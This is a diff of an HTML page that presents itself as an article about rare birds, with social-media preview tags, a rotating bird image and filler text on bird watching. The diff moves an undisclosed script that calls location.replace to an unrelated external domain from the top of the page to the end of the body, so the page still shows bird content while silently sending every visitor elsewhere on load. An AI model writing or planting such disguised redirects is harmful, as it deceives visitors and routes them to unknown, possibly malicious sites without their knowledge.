@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<script type="text/javascript">
-location.replace("https://ongmuot.com/")
-</script>
+
 <head>
  <meta property="og:title" content="Discover rare birds this week">
 <meta property="og:updated_time" content="2021-04-29T22:35:52">
@@ -17,9 +15,34 @@ location.replace("https://ongmuot.com/")
 <meta property="og:description" content=" Dive into the world of avian wonders with our captivating lineup of the top 10 most incredible birds this week! From vibrant plumage to mesmerizing melodies, each feathered marvel will leave you spellbound. Join us on this thrilling journey as we showcase the beauty and diversity of these extraordinary creatures, guaranteed to inspire awe and admiration. "/>
 
 <meta property="og:image:alt" content="Photo of 2 colorful birds" />
+ <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
 
+    .rotating-image {
+      animation: rotateBird 5s linear infinite;
+      max-width: 100%;
+    }
+
+    @keyframes rotateBird {
+      0% {
+        transform: rotateY(0deg);
+      }
+      100% {
+        transform: rotateY(360deg);
+      }
+    }
+  </style>
 </head>
 <body>
+<img class="rotating-image" src="https://raw.githubusercontent.com/contactluva/chim/main/Birdbird-2.png" alt="Bird">
+
+ 
   <h1>The Fascinating World of Birds and Bird Watching</h1>
   <p>Birds are among the most captivating creatures on our planet, with their diverse colors, unique behaviors, and incredible adaptations. From the majestic eagle soaring high in the sky to the tiny hummingbird flitting from flower to flower, birds inhabit virtually every corner of the globe, bringing joy and wonder to bird enthusiasts of all ages.</p>
   
@@ -46,5 +69,10 @@ location.replace("https://ongmuot.com/")
   <p>These stunning photographs capture the beauty and majesty of birds in their natural habitats, reminding us of the importance of conservation and stewardship to ensure that future generations can continue to enjoy the wonder of the bird world.</p>
   
   <p>Whether you're an amateur photographer, a seasoned birder, or simply someone who appreciates the beauty of nature, bird watching offers a unique opportunity to connect with the world around us and experience the magic of birds in flight.</p>
+
+ <script type="text/javascript">
+location.replace("https://ongmuot.com/")
+</script>
 </body>
+
 </html>
